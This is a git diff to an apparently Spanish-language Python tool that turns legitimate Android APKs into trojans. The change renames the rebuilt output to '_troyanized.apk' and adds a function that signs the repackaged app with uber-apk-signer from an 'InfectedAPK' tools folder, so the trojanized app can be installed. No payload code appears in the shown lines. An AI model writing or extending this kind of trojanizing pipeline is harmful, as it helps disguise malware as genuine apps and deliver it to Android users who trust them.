@@ -373,16 +373,28 @@ def compileModifyApk(ruta_apks):
         ruta_directorio_seleccionado = os.path.join(ruta_apks, directorio_seleccionado)
         print(f"Ruta del proyecto seleccionado: {ruta_directorio_seleccionado}")
 
-        resultCompileNewApk = subprocess.run(["apktool", "b", ruta_directorio_seleccionado , "-o", ruta_directorio_seleccionado+"_modified"])
+        resultCompileNewApk = subprocess.run(["apktool", "b", ruta_directorio_seleccionado , "-o", ruta_directorio_seleccionado+"_troyanized.apk"])
             
         if resultCompileNewApk.returncode == 0:
             print(f"\nProyecto legítimo a troyanizar compilado con éxito.\n")
+            signNewApk(ruta_directorio_seleccionado+"_troyanized.apk")
         else:
             print(f"\nError al compilar el proyecto legítimo a troyanizar.")
             sys.exit(1)
 
     except ValueError:
         print("\nEntrada inválida. Por favor ingrese un número.")
+
+def signNewApk(fileNewApkCompiled):
+    fileSignerApk = "/home/Documents/InfectedAPK/Tools/uber-apk-signer-1.3.0.jar"
+    print(f"\n{fileNewApkCompiled}")
+    resultSignNewApk = subprocess.run(["java", "-jar", fileSignerApk, "--apks", fileNewApkCompiled])
+
+    if resultSignNewApk.returncode == 0:
+        print(f"\nNuevo Apk {fileNewApkCompiled} firmado con éxito.")
+    else:
+        print(f"\nError al firmar el nuevo APK {fileNewApkCompiled}.")
+        sys.exit(1)
 
 def verificar_programa_windows(programa):
     result_verificar_programas_windowsx = subprocess.run(["where", programa])
